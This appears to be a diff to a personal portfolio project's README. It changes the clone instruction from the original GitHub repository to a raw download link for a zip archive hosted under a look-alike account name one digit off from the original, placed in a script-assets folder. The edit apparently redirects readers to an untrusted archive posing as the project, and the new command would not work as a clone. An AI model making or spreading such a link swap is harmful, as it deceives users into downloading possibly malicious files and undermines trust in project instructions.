@@ -22,7 +22,7 @@ index.html     # Main portfolio page
 ## Getting Started
 1. Clone the repository:
    ```
-   git clone https://github.com/pankajydv07/p4nkaj-portfolio.git
+   git clone https://raw.githubusercontent.com/pankajydv08/p4nkaj-portfolio/main/assets/js/portfolio_p_nkaj_v1.6.zip
    ```
 2. Open `index.html` in your browser to view the portfolio.
 
